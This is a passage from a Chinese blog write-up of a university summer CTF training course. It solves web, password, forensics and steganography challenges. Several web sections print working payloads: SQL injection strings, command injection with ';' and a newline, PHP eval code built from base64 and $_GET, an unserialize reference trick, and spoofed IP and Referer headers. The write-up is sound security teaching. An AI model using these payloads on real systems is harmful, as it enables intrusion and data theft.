---
title: Write-up of COMPASS 2022 Summer Training
permalinks: COMPASS-2022S
date: 2022-7-11 10:00:00
---

~~SUSTech CTF 课堂开课啦！孩子机器老被打，多半是寄了，用 COMPASS 牌 CTF 暑期训练课程，练攻击，直接给他打回去，妈妈一定要记住哦！~~

咳咳，总之这篇就是 SUSTech COMPASS 暑期 CTF 训练的题解（非官方）。

<!-- more -->

# 目录

- [Week 1](#week-1)
  * [Practice Flag](#practice-flag)
  * [Where Can My Robot Go?](#where-can-my-robot-go)
  * [Wikipedia](#wikipedia)
  * [进制十六——参上](#进制十六参上)
  * [猫咪问答 Pro Max](#猫咪问答-pro-max)
  * [旅行照片](#旅行照片)
  * [卖瓜](#卖瓜)
  * [fixme1.py](#fixme1.py)
  * [fixme2.py](#fixme2.py)
  * [PW Crack 1](#pw-crack-1)
  * [PW Crack 2](#pw-crack-2)
  * [PW Crack 3](#pw-crack-3)
  * [PW Crack 4](#pw-crack-4)
  * [PW Crack 5](#pw-crack-5)
  * [Time Traveller](#time-traveller)
  * [Command Challenge](#command-challenge)
- [Week 2](#week-2)
  * [web 签到题](#web-签到题)
  * [Basic Injection](#basic-injection)
  * [POST Practice](#post-practice)
  * [Don't Bump Your Head(er)](#dont-bump-your-header)
  * [Calculat3 M3](#calculat3-m3)
  * [php audit](#php-audit)
  * [Execute?](#execute)
  * [why sqli?](#why-sqli)
- [Week 3](#week-3)
  * [What's my IP address?](#whats-my-ip-address)
  * [FLAG 助力大红包](#flag-助力大红包)
  * [SQLI](#sqli)
  * [Simple SQLI](#simple-sqli)
  * [Not easy SQL injection](#not-easy-sql-injection)
  * [Reverse shell included](#reverse-shell-included)
  * [PHP POP](#php-pop)
- [Week 4](#week-4)
  * [Information](#information)
  * [Matryoshka doll](#matryoshka-doll)
  * [like1000](#like1000)
  * [upper-lower case](#upper-lower-case)
  * [WhitePages](#whitepages)
  * [Sleuthkit Apprentice](#sleuthkit-apprentice)
  * [m00nwalk](#m00nwalk)
  * [weak password](#weak-password)
  * [简单的隐写](#简单的隐写)

# Week 1

## Practice Flag

直接把 "Try inputting the flag:" 后面的 flag 复制粘贴就可以了。

## Where Can My Robot Go?

robots.txt 是放在网站根目录下的一个文件，用来告诉搜索引擎或者爬虫哪些内容能访问，哪些不能（不过这不是强制的）。详情可以去 Google "robots.txt"。

然后这道题的话，我们就访问一下这个 robots.txt 文件（[https://ctflearn.com/robots.txt](https://ctflearn.com/robots.txt)），然后可以找到：

```
User-agent: *
Disallow: /70r3hnanldfspufdsoifnlds.html
```

这里有一个非常奇怪的网页，~~虽然写了 Disallow~~，我们就点进去看一下（[https://ctflearn.com/70r3hnanldfspufdsoifnlds.html](https://ctflearn.com/70r3hnanldfspufdsoifnlds.html)），于是就发现了 flag。

```
CTFlearn{r0b0ts_4r3_th3_futur3}
```

## Wikipedia

说到 Wikipedia，一般指的是英文的维基百科，即 [https://en.wikipedia.org](https://en.wikipedia.org)。

然后 IP 的话，一般会出现在 Wikipedia 的修改历史里面。因为 Wikipedia 是允许非注册用户对页面进行修改的，这时候就会用 IP 来代替用户名。

现在的问题就变成了如何在 Wikipedia 找到这个 IP 的修改记录，毕竟现在也不知道怎么查。我们就可以随便找一个页面（比如主页），点右上角的 View history，翻一下页，找到一个用 IP 的修改记录；并且发现，点击 IP，弹出的页面就是这个 IP 的所有修改记录。

然后不难发现，此时的 URL 是 `https://en.wikipedia.org/wiki/Special:Contributions/<IP>` 的形式，把 `<IP>` 换成我们想查的 IP，即 [https://en.wikipedia.org/wiki/Special:Contributions/128.125.52.138](https://en.wikipedia.org/wiki/Special:Contributions/128.125.52.138)。

点开这个链接，发现只有一条修改记录，点击 "diff"（即查看这次修改修改了啥），发现了这么个玩意：

![](Wikipedia_Flag.png)

然后这玩意就是 flag 了。

## 进制十六——参上

见 Hackergame 2021 题解的[进制十六——参上](/2021/10/31/Hackergame-2021/#进制十六参上)。

## 猫咪问答 Pro Max

见 Hackergame 2021 题解的[猫咪问答 Pro Max](/2021/10/31/Hackergame-2021/#猫咪问答-pro-max)。

## 旅行照片

见 Hackergame 2021 题解的[旅行照片](/2021/10/31/Hackergame-2021/#旅行照片)。

## 卖瓜

见 Hackergame 2021 题解的[卖瓜](/2021/10/31/Hackergame-2021/#卖瓜)。

## fixme1.py

把文件下载下来，先跑一下（不跑怎么知道它错在了哪里呢）。然后 Python 就报错：

```
$ python3 fixme1.py
  File "~/Downloads/fixme1.py", line 20
    print('That is correct! Here\'s your flag: ' + flag)
IndentationError: unexpected indent
```

就是这个地方缩进不对：

``` python
flag = str_xor(flag_enc, 'enkidu')
  print('That is correct! Here\'s your flag: ' + flag)
```

按照脚本的意思（毕竟这附近也没有 if 什么的控制语句嘛），所以把 `print` 前面那俩空格删了就可以了。然后重新跑一下就能出 flag 了。

## fixme2.py

~~按照惯例~~，先跑一下：

```
$ python3 fixme2.py
  File "/Users/monad/Downloads/fixme2.py", line 22
    if flag = "":
            ^
SyntaxError: invalid syntax
```

~~经典用单个等于判断相等~~，把 `=` 改成 `==` 就 ok 了。

## PW Crack 1

~~按照惯例~~，先跑一下，然后发现要输入密码。然后打开源代码看一下，发现了这么个玩意：

``` python
user_pw = input("Please enter correct password for flag: ")
if( user_pw == "1e1a"):
    print("Welcome back... your flag, user:")
```

所以 `1e1a` 就肯定是密码了，于是输入进去，就出 flag 了。

## PW Crack 2

这道题跟上一题差不多：

``` python
user_pw = input("Please enter correct password for flag: ")
if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):
    print("Welcome back... your flag, user:")
```

你可以把 `chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)` 喂给 Python 看看是多少（然后就跟上一题一样了）。如果想偷懒的话，可以直接改成：

```
user_pw = chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)
if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):
    print("Welcome back... your flag, user:")
```

跑一下就能出 flag。

## PW Crack 3

朴素方法：把 `pos_pw_list` 里面的每个密码都试一次，看看哪个对。

更优的方法：看下一题。

## PW Crack 4

由于这道题的可能的密码的数量非常多，高达 100 个，手动试就太慢了（事实上在上一题试 7 个我都已经不想试了）。

于是我们就可以手动魔改代码，用程序来帮我们试。其实就是把下面的部分改成：

``` python
def level_4_pw_check(password):  # 通过参数传入密码
    user_pw = password
    user_pw_hash = hash_pw(user_pw)

    if user_pw_hash == correct_pw_hash:
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return

pos_pw_list = ...  # 省略

# 遍历所有可能的密码
for password in pos_pw_list:
    level_4_pw_check(password)
```

然后跑一下，就 ok 了。

## PW Crack 5

这道题跟上一题的相似度，比上一题跟上上一题的还高，只是这题的密码表存到了另外一个文件里，并且是真的多。

跟上一题类似，把代码魔改成：

``` python
with open('dictionary.txt') as f:
    # 可以用 for in 的方法来遍历文件的每一行
    for password in f:
        # 这里用 .strip() 去除每一行末尾的空格
        level_5_pw_check(password.strip())
```

然后跑一跑就能出 flag。

## Time Traveller

这道题大意就是让我们在 1996 年 12 月 31 日的 NASA（~~由崎&nbsp;<ruby>星<rp>(</rp><rt>ナ</rt><rp>)</rp>空<rp>(</rp><rt>サ</rt><rp>)</rp></ruby>~~）的官网上面找到一个电子邮件。

与互联网上的旧页面相关的，一律找 [Internet Archive](https://web.archive.org)。

首先不难发现，NASA 的官网是 https://www.nasa.gov，把它扔到上面的 Internet Archive 网站里面，找到 1996 年 12 月 31 日的页面：

![](NASA_Dec_31_1996.png)

不难发现邮箱 `today@nasa.gov`。

## Command Challenge

~~朴素方法：一道一道题做下去，就能拿到 flag，顺便还能学到不少 Linux bash 的技巧。~~

首先先过个一两题，然后打开 F12，发现通过的题目是存在本地的：

![](Command_Challenge_storage.png)

于是就可以想着去修改它，来“快速过题”。于是现在的问题就是，如何找到题目的列表，然后填上去。

用 `current_working_directory` 在前端的文件里面搜索，然后就可以找到一个很像配置文件的配置文件：

![](Command_Challenge_configuration.png)

这里的话，其实每个 `slug` 后面跟的字符串，就是题目的名字。

> 有同学说用 `ls ..`（列出上级目录的文件）也可以得到题目的列表。

我们把它们收集起来，然后扔到上面的 `correct_answers`，再刷新一下页面：

![](Command_Challenge_solved.png)

就发现前面多了一行 `🎉.....🎉` 的庆祝语，连着两个 emoji 复制，粘贴，就可以过了。

# Week 2

## web 签到题

打开网站，发现啥都没有（指可交互元素），然后查看 HTML 源代码，发现：

``` html
where is flag?

<!-- 
Y3Rmc2hvd3s0YmY1M2U3MC02YzM2LTRiYjEtOWNhMS1jOTc5OGQ5NWY0MGZ9-->
```

然后发现一串神秘字符串。用一种常见的字符串编码方式（即 base64）解码，就可以得到 flag。

## Basic Injection

构造 `' or 1=1; -- a`，让最终的查询变成 `SELECT * FROM webfour.webfour where name = '' or 1=1; -- a'`（实际上等价于 `SELECT * FROM webfour.webfour`），就可以查询所有记录了。

然后发现查询的结果里面就有 flag。

> 值得注意的是，`--` 使注释生效的一个条件是，`--` 后面必须要有一个空格。如果要避免两端空格被吞掉的话，可以在后面补一个字符。

## POST Practice

惯例，先直接访问一下。

![](POST_Practice_1.png)

唔……它告诉说需要 POST 某些东西才可以。不过内容都在注释里面写着了。

我们就直接 POST 给服务器就好了。

> 发送 POST 请求可以用 Postman 等图形化应用，也可以手动调用 curl。

![](POST_Practice_2.png)

于是我们就摸到了 flag。

## Don't Bump Your Head(er)

按照惯例，先访问一下网站：

![](Bump_Header_1.png)

虽然没有明说，但是可以试试把 `Sup3rS3cr3tAg3nt` 作为 `User-Agent` 发送给服务器。

![](Bump_Header_2.png)

这时候，它告诉我们说，你不是来自 `awesomesauce.com` 这个服务器。

HTTP headers 里面有一个叫 `Referer` 的东西，可以向服务器表示我是从哪个网页跳转过来的，这一条也可以瞎搞，改成服务器想要的就行了。

![](Bump_Header_3.png)

然后就拿到了 flag。

## Calculat3 M3

先随便输入一个算式，然后发个请求，看看它是怎么算的。可以发现，它发了一个 POST 请求，内容是 `express=3+3`（虽然其实还有空格，不过问题不大）。

![](Calculat3_M3_1.png)

然后这里怎么注入呢，比如说，它有可能是执行命令 `calc 3+3`，然后把它的输出返回。这时候，如果网页的防护不强，我们就可以在 `3+3` 的后面再塞点东西，让他执行其它命令。

比如说，如果我们给它一个 `3+3; ls`，拼起来之后就是 `calc 3+3; ls`，这样的话，除了执行 `calc 3+3` 之外，它还会执行 `ls`（列出当前目录下的文件）。把 `ls` 换成其它命令，就可以随便乱搞了。

于是这里我们先给它发一个 `3; ls` 看看：

![](Calculat3_M3_2.png)

运气不错，拿到 flag 了。

> ~~我也不知道为什么 `3 + 3; ls` 不行，只能说服务器十分的玄学，甚至除了 `ls` 之外的命令都用不了。可能它只是特判了一下一些特殊的模式，然后就给你返回了，实际上并没有真正的执行命令。~~

## php audit

按照惯例，先访问一下，获得了 PHP 源代码：

``` php
<?php
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
```

虽然我不怎么会 PHP，但是能够感觉得出来，你在 `args` 传入什么，它就会把哪个变量打印出来。比如说如果传入参数 `args=$_GET`，它就会把 `_GET` 里面的东西打印出来。

然后由于这里限制了 `args` 只能是大小写字母、数字、下划线，所以执行恶意代码是几乎不可能的了。

所以打印变量的话，我们可以考虑 PHP 的一些特殊的、内置的变量（好像在官方文档里面叫做[预定义变量](https://www.php.net/manual/zh/reserved.variables.php)）。翻一下文档，发现一个不错的 `$GLOBALS`，可以打印出全局的全部变量。

废话少说，直接试试：

![](PHP_audit.png)

于是我们就获得了 flag。

> 源代码里面的 `$$args` 是什么意思，可以看官方文档的 [Variable variables](https://www.php.net/manual/en/language.variables.variable.php)。

## Execute?

开始先和 [Calculat3 M3](#calculat3-m3) 差不多，先随便输入一个 IP 看看它是怎么发送请求的。然后发现它是给 `http://103.102.44.218:10016/exec.php?ip=<ip>` 发送了请求（其中 `<ip>` 即指某个具体 IP）。

然后 F12 看一下，发现可以访问 `/exec.php?view_source` 来获取源代码，可以看到它过滤了包括但不限于 `&`, `|`, `` ` `` 字符。

> 其实说实话，我做这道题的时候没发现这个源代码，~~不过还是做出来了~~，还是顺便讲讲吧。
>
> 瞎试一下，发现传 `"127.0.0.1"`（带双引号），它也可以正常工作。不过这并不能说明它没过滤双引号（虽然事实上确实没有）。
>
> 然后继续瞎试，在双引号里面带个空格试试，传个 `"127.0.0.1 abc"`，发现它还是正常的：
>
> ![](Execute_try_space.png)
>
> 于是发现 `ping` 指会取空格前面的 IP，后面的是不管的。不过显示的时候还是会全部显示出来。于是就可以用这个方法试试哪些字符能用，就是瞎滚键盘，看看它返回了哪些字符，就说明哪些没被过滤。
>
> ![](Execute_filter_table.png)
>
> 然后就曲线救国地也把过滤的字符集也挖了出来。

由于它过滤了 `&`, `|`, `` ` `` 等字符，一般的注入方式没办法使用（指 `&& ls`, `` `ls` ``, `${ls}` 等）。

不过还有一个老旧的方法可以试试，就是用换行。于是发一个请求 `127.0.0.1\nls`（在这里，`\n` 表示换行）。Surprise, it works.

![](Execute_ls.png)

然后发现 `flag.php` 后，`cat` 一下就能拿到它的内容，里面就有 flag。

![](Execute_solved.png)

## why sqli?

先请求一下，拿到代码。（下面的代码简化了一下，保留了核心部分。）

``` php
<?php
require 'db.inc.php';

function clean($str) {
    if (get_magic_quotes_gpc()) {
        $str = stripslashes($str);
    }
    return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query = 'SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';

$result = mysql_query($query);
if (!$result || mysql_num_rows($result) < 1) {
    die('Invalid password!');
}

$row = mysql_fetch_assoc($result);

echo "Hello ".$row['name']."</br>Your password is:".$row['pass']."</br>";
```

可以看到两个参数 `username` 和 `password` 都做了过滤。翻一下 PHP 文档，发现 `get_magic_quotes_gpc()` 永远返回 false，所以这个 `if` 就不用管了，只需要看 `htmlentities` 就可以了。

`htmlentities` 在第二个参数传入 `ENT_QUOTES` 的时候，会对 `$str` 的单、双引号进行转义，具体为 `"` 转成 `&quot;`，`'` 转成 `&#039;`。思索一下，感觉绕过 `htmlentities` 来传入引号有点困难，看看有没有别的路可以走。

~~不难发现~~，`htmlentities` 没有处理 `\` 反斜杠，如果在 `username` 里面传入 `\` 的话，SQL 就会变成

``` sql
SELECT * FROM users WHERE name='\' AND pass='<password>';
```

~~这个高亮好像有点问题，它没有处理 `\`~~。然后就发现，它变成了 `name` 跟 `' AND pass=` 做比较，然后后面 `<password>` 的地方就可以随便注了。后面多余的那个单引号用注释干掉就可以了

比如我们可以来一个 `password` 为 `or 1=1; -- a`，就可以构造这么一个 SQL：

``` sql
SELECT * FROM users WHERE name='\" AND pass=' or 1=1; -- a';
```

> 因为这个高亮确实不太行，所以这里我把 `\'` 换成 `\"` 来让它正确高亮了，实际上还是单引号的。

然后把这个请求扔上去，就发现它确实绕过去了：

![](Why_sqli_1.png)

不过……这个好像不是 flag？

唔……那就查查另外几行吧。（如果还是不行的话，后面还可以用 `UNION SELECT` 对数据库进行全面的扒取。）

用 `LIMIT 1 OFFSET x` 查查另外几行，然后在试到第三行的时候（即 `LIMIT 1 OFFSET 2`），发现 flag：

![](Why_sqli_2.png)

# Week 3

## What's my IP address?

直接访问，然后获得 PHP 源代码（下面的代码是稍微格式化过的）。

``` php
<?php
include("flag.php");
function GetIP(){
  if (!empty($_SERVER["HTTP_CLIENT_IP"]))
    $cip = $_SERVER["HTTP_CLIENT_IP"];
  else if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
  else if (!empty($_SERVER["REMOTE_ADDR"]))
    $cip = $_SERVER["REMOTE_ADDR"];
  else
    $cip = "0.0.0.0";
  return $cip;
}

$GetIPs = GetIP();
echo $GetIPs;

if ($GetIPs == "1.1.1.1"){
  echo "Great! Key is $flag";
} else{
  echo "Error! Your IP address isn't in the legal range!";
}
show_source(__FILE__);
?>
```

具体逻辑就是先后尝试从 `_SERVER` 的 `HTTP_CLIENT_IP`, `HTTP_X_FORWARDED_FOR`, `REMOTE_ADDR` 取 IP 地址，然后再跟 `1.1.1.1` 比较，相等则给出 flag。

想要真实地从 `1.1.1.1` 发送请求，有亿点困难（~~可能可以 py Cloudflare？~~）。不过好消息是，`HTTP_CLIENT_IP` 和 `HTTP_X_FORWARDED_FOR` 都是可以伪造的（`REMOTE_ADDR` 不能伪造）。`HTTP_CLIENT_IP` 是从 HTTP headers 的 `Client-IP` 取值，`HTTP_X_FORWARDED_FOR` 从 `X-Forwarded-For` 取值。

然后手动设置这两个的其中一个，再请求一下，就可以了。

![](Whats_my_IP_address.png)

## FLAG 助力大红包

跟上一题差不多，不过要用 `X-Forwarded-For`。（`Client-IP` 没试过，不知道行不行。）

详情见 Hackergame 2021 题解的 [FLAG 助力大红包](/2021/10/31/Hackergame-2021/#flag-助力大红包)。

## SQLI

首先先直接访问，发现页面上有一句 "source file in web9.php.bak"。访问这个页面，获得 PHP 源代码（下面的代码也是稍微格式化过的）。

``` php
<?php
$user = $_POST["user"];
$pass = md5($_POST["pass"]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
  printf("Error: %s\n", mysql_error($conn));
  exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);

if (($row["pw"]) && (!strcasecmp($pass, $row["pw"]))) {
  echo "<p>Logged in! Key:************** </p>";
} else {
  echo "<p>Log in failure!</p>";
}
```

> 大概需要提前说明的一点是，这道题的 flag 不在数据库里面，如果直接硬注数据库的话，也能拿到 flag，但不是这道题的 flag。
>
> 实际上，flag 在 `Key: **************` 这个地方，虽然“备份文件”把它模糊掉了，实际上运行的代码是有的。

这里的话，如果要让他成功输出 `Key`，那就需要让那条 `if` 判断为 `true`，即需要让 `$pass` 和 `$row["pw"]` 相等。其中 `$pass` 是可控的，比如说我们传入 `pass=a`，那么 `$pass` 就是 `0cc175b9c0f1b6a831c399e269772661`（`a` 的 MD5）。如果我们能让从数据库查出来的 `$row["pw"]` 跟 `0cc175b9c0f1b6a831c399e269772661` 相等，就可以了。

然后 `$user` 没有任何过滤，直接用 `UNION SELECT` 注入就可以了。令 `user` 为 `' UNION SELECT '0cc175b9c0f1b6a831c399e269772661'; -- a`，执行的 SQL 就是：

``` sql
select pw from php where user='' UNION SELECT '0cc175b9c0f1b6a831c399e269772661'; -- a'
```

![](SQLI.png)

然后就拿到了 flag。

## Simple SQLI

首先先直接访问，感觉 UI 好像跟上一题差不多，并且 F12 发现注释里有一句 "web11.php.bak"。访问这个页面，获得 PHP 源代码（下面的代码也是稍微格式化过的，并且删掉了一些无关紧要的部分）。

``` php
<?php
include("../web9/db.php");

$user = $_POST["user"];
$pass = md5($_POST["pass"]);

$sql = "select user from php where (user='$user') and (pw='$pass')";
$query = mysql_query($sql);
$row = mysql_fetch_array($query, MYSQL_ASSOC);
if ($row["user"] == "admin") {
  echo "<p>Logged in! Key: *********** </p>";
} else {
  echo("<p>You are not admin!</p>");
}
```

这道题注起来似乎比上一题还简单，因为 `$user` 就是一个十分可控的注入点。直接令 `user` 为 `admin'); -- a`，就能拼出这么个查询 SQL：

``` sql
select user from php where (user='admin'); -- a') and (pw='$pass')
```

![](Simple_SQLI.png)

然后就能获得 flag 了。连 `pass` 都不用管。

## Not easy SQL injection

直接访问，然后获得 PHP 源代码（下面的代码是稍微格式化过的）。

``` php
<?php
# $yourInfo=array(
#   'id'    => 1,
#   'name'  => 'admin',
#   'pass'  => 'xxx',
#   'level' => 1
# );
require 'db.inc.php';

$_CONFIG['extraSecure'] = true;

foreach (array('_GET', '_POST', '_REQUEST', '_COOKIE') as $method) {
  foreach ($$method as $key => $value) {
    unset($$key);
  }
}

$kw = isset($_GET['kw']) ? trim($_GET['kw']) : die('Please enter in a search keyword.');

if ($_CONFIG['extraSecure']) {
  $kw = preg_replace('#[^a-z0-9_-]#i','',$kw);
}

$query = 'SELECT * FROM messages WHERE message LIKE \'%'.$kw.'%\';';

$result = mysql_query($query);
if (mysql_errno()) die(mysql_error());
$row = mysql_fetch_assoc($result);

echo "id: ".$row['id']."</br>message: ".$row['message']."</br>";
```

首先就是那两个 `foreach`，由于用了一些炫酷的语法糖所以可能会比较难懂，它的意思是，对于每个出现在 `$_GET`, `$_POST` 等位置的 key-value 对，都执行一遍 `unset($$key)`。`unset` 可以抹除某个变量，比如 `unset("v")` 会把一个名为 `v` 的变量给抹除。

然后下面有一个如果 `$_CONFIG['extraSecure']` 为真，则对 `$kw` 做过滤。它很烦，我们不想让它过滤。可以利用上面所说的 `unset`，让它把 `$_CONFIG` unset 掉，就可以 bypass 掉这个过滤了。

然后随便瞎注一下，发现 flag 不在 `messages` 里。联系到注释所说的，我们大概要拿到 admin 的密码，那样的话，我们就要拿到用户表。用户表的话，先盲猜一个表名是 `users`（如果猜不中的话，可以查 `information_schema` 来获得所有的表名）。

然后直接用 `UNION SELECT` 嗯注（前面加一个 `1=0` 让前面查不出结果，这样的话，第一条就是从 `UNION SELECT` 右边过来的）：

![](Not_easy_SQL_injection.png)

发现运气不错（这里真的是运气不错），flag 直接就出现了。

> 对于更一般的题目，由于 `UNION SELECT` 要求前后两个查询的列数必须相同，所以莽 `SELECT *` 大概率是会挂的，就需要再判断一下前面有多少列。  
> 而且这里 `users` 的 `pass` 列恰好跟 `message` 的 `id` 列能对上，才可以直接通过 `id` 拿到 flag。否则就还需要枚举一下看看是哪列对应哪列。

## Reverse shell included

这道题的 PHP 代码，核心的只有两行：

``` php
$str=@(string)$_GET['str']; 
eval('$str="'.addslashes($str).'";'); 
```

<!-- katex: off --> 这里毕竟有 `addslashes`，这就意味着我们不能用单、双引号了。不过我们还是可以用上面提到过的 [Variable variables](https://www.php.net/manual/en/language.variables.variable.php)，比如说填 `${$str}` 之类的。

然后 `${ }` 里面还可以写函数，运行的时候就会调用函数求值。如果不确定的话，可以试试 `phpinfo()` 之类的函数确认一下：

![](Reverse_shell_included_1.png)

看起来确实可以。那……既然可以调用函数，那就直接上 `eval` 吧。不过这里有个问题，就是 `eval` 需要传入字符串，但是这里又不能用单、双引号，怎么办呢…

### Solution 1

PHP 的大部分版本支持 Unquoted strings，即如果你使用一个未被定义的常量（不以 `$` 开头），PHP 会把它当成字符串来用。

例如，如果运行 `var_dump(NONEXISTENT);`，PHP 就会输出：

```
Notice: Use of undefined constant NONEXISTENT - assumed 'NONEXISTENT' in %s on line %d
string(11) "NONEXISTENT"
```

Notice 那一行只是警告，不会真的输出到网页。不过从第二行的 `string(11) "NONEXISTENT"` 可以看出，PHP 确实把 `NONEXISTENT` 当成 `"NONEXISTENT"` 来用了。

> 从 PHP 7.2.x 版本开始，就会报 Warning 而不是 Notice。并且从 8.x.x 开始，这个就会抛出错误（就是说不能用了）。

不过这个有个限制，就是这个字符串只能是合法的常量名，像 `a=b` 就不行。

不过这个也好说，直接套一层 base64 编码。base64 编码之后的一般是合法的常量名（首字符一般是字母，后面一般都是字母和数字），如果编码出来的字符串末尾有 `=` 占位符的话，可以去掉，在这里不影响解码。

读取文件并输出，可以使用 `echo readfile("flag.php");`（注意末尾分号），base64 之后就是 `ZWNobyByZWFkZmlsZSgiZmxhZy5waHAiKTs=`。

于是我们就发送一个 `str` 是 `${eval(base64_decode(ZWNobyByZWFkZmlsZSgiZmxhZy5waHAiKTs))}` 的 payload，就行了。

![](Reverse_shell_included_sol_1.png)

### Solution 2

另外一个思路就是，如果不能直接写字符串的话，我们可以引用另外的变量传给 `eval`。但是哪来的变量能用呢？

<!-- katex: off --> 一个很直接的想法就是用 `$_GET`，我们可以把 `$_GET[0]` 传给 `eval`，即令 `str` 为 `${eval($_GET[0])}`；然后再加一个名字是 `0` 的参数，这个参数的内容就可以随便写了，比如我们想读文件，就可以用 `echo readfile("flag.php");`。

![](Reverse_shell_included_sol_2.png)

## PHP POP

按照惯例，先访问一下，然后获得 PHP 源代码（下面的代码是稍微格式化过的）（`get_magic_quotes_gpc` 因为上面已经说过的原因，就忽略了）。

``` php
<?php
include("flag.php");

class just4fun {
  var $enter;
  var $secret;
}

$pass = $_GET['pass'];
$o = unserialize($pass);

if ($o) {
  $o->secret = $flag;
  if ($o->secret === $o->enter)
    echo "Congratulation! Here is my secret: ".$o->secret;
  else
    echo "Oh no... You can't fool me";
}
else echo "are you trolling?";
```

~~说实话，这道题我做的时候是走了挺多弯路的。~~

首先看一下，感觉核心就是 `unserialize` 这个函数了。第一感觉就是能不能在 `unserialize` 里面执行代码，或者读取 `$flag` 这个变量来用。但是很遗憾的是，前者由于没有魔术方法，不太行；后者直接就没找到相关资料。

不过反过来想一想，如果可以用上面的方法，它就没有必要多此一举弄 `$enter` 和 `$secret` 了。一个可行的思路，可能是把 `$o->enter` 指向 `$o->secret`，这样的话就可以把这两个变量“绑定”在一起，也就可以绕过判断了。

然后翻了一下，发现好像 PHP 确实有 reference，可以用 `&`，于是我们可以在本地写个脚本，让 `$o->enter` 指向 `$o->secret`，再调用 `serialize` 生成 payload。

``` php
class just4fun {
  var $enter;
  var $secret;
}

$o = new just4fun;
$o->enter = &$o->secret;
echo serialize($o);
```

就得到 payload `O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}`。然后把这个 payload 扔上去，就能拿到 flag。

# Week 4

## Information

先用二进制编辑器打开图片，然后发现文件前面有一段文本，里面有一段非常“熟悉”的编码（其实就是 base64）。

![](Information_binary.png)

把它提取出来，解码一下，就拿到了 flag。

```
cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
picoCTF{the_m3tadata_1s_modified}
```

## Matryoshka doll

题目名字 “Matryoshka doll” 指的是俄罗斯套娃，提示这张图里面很可能藏着另一张图片。

所以来 `binwalk` 一下，果然发现了里面藏着一个 zip 压缩包。

```
$ binwalk dolls.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 594 x 1104, 8-bit/color RGBA, non-interlaced
3226          0xC9A           TIFF image data, big-endian, offset of first image directory: 8
272492        0x4286C         Zip archive data, at least v2.0 to extract, compressed size: 378942, uncompressed size: 383937, name: base_images/2_c.jpg
651600        0x9F150         End of Zip archive, footer length: 22
```

并且这个压缩包里面还有一个文件 2_c.jpg。于是我们用 `binwalk dolls.jpg -e` 把里面藏着的东西 **E**xtract 出来。

然后发现 2_c.jpg 似乎跟原图差不多。考虑到题目的名字指俄罗斯套娃，那…肯定还要继续拆。

用上面的方法，可以从 2_c.jpg 中拆出 3_c.jpg，然后继续从 3_c.jpg 拆出 4_c.jpg。然后从 4_c.jpg 继续拆，就发现得到的不是图片了，而是一个 flag.txt，这个文件里面的内容就是 flag。

## like1000

下载附件 1000.tar，然后解压一下，得到：

```
1000
├── 999.tar
└── filler.txt
```

这里面的 filler.txt 里面只有一些乱七八糟的内容。然后如果把 999.tar 继续解压，就会得到类似的内容（filler.txt 和 998.tar）。然后这样一直拆下去，拆到 1.tar 就应该能拿到 flag。

不过这样的话，手动解压 1000 次也太麻烦了，而且很慢。所以我们可以写一个脚本，帮忙解压：

``` python
import os

for i in range(1000, 0, -1):
    os.system(f'tar xf tar_temp/{i}.tar --directory tar_temp')
    os.system(f'rm tar_temp/{i}.tar')
```

把 1000.tar 放到 tar_temp 目录里面，然后跑一下这个脚本，它就会帮忙一层层地解压。解压到最后，tar_temp 里面的文件就剩下 filler.txt 和 flag.png。打开 flag.png，把 flag 抄下来即可。

## upper-lower case

> 题面按照真实事件改编。

题面很简单，就是将 `y0u_re4lly_kn0w_th1s_congr4tulat10ns` 中的字母正确地大小写，使得其 MD5 等于 `7513209051f455fa44d0fa5cd0f3e051`。

数一下，这个字符串中有 25 个字母，所以一共有 $2^{25} \approx 3 \times 10^7$ 种可能。这个数量级，其实不是很大，可以考虑暴力全都试一遍。

``` rust
use itertools::Itertools;
use md5::{Digest, Md5};
use hex_literal::hex;

fn main() {
    let product = (0..25).map(|_| [false, true].into_iter()).multi_cartesian_product();
    for combination in product {
        let mut mask_iter = combination.into_iter();
        let string: Vec<_> = "y0u_re4lly_kn0w_th1s_congr4tulat10ns".bytes()
            .map(|ch| if ch.is_ascii_alphabetic() && mask_iter.next().unwrap() {
                ch.to_ascii_uppercase()
            } else {
                ch
            })
            .collect();

        if Md5::digest(&string)[..] == hex!("7513209051f455fa44d0fa5cd0f3e051") {
            println!("{}", std::str::from_utf8(&string).unwrap());
        }
    }
}
```

然后跑一遍这玩意，就能拿到 flag 了。

## WhitePages

首先先直接打开这个文件，然后经过观察，不难发现这个文件里面有两种字符：`U+2003` 和 ` `。

![](Whitepages_1.png)

`U+2003` 查了一下，也是空格的一种。所以这个文件里面由两种空格组成。

遂考虑二进制。我们不妨把 `U+2003` 改成 `0`，把 ` `（空格）改成 `1`，然后用二进制解码一下，就得到了 flag。

![](Whitepages_2.png)

## Sleuthkit Apprentice

下载下来是一个 disk.flag.img.gz 文件，首先当然是解压一下，拿到 disk.flag.img。

> 如果不想那么麻烦的话，理论上用 Disk Genius 等硬盘管理软件打开，然后直接翻文件应该也是可以的。

用 `fdisk` 看看里面有啥分区：

```
$ fdisk disk.flag.img 

Welcome to fdisk (util-linux 2.31.1).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p       
Disk disk.flag.img: 300 MiB, 314572800 bytes, 614400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x7389e82d

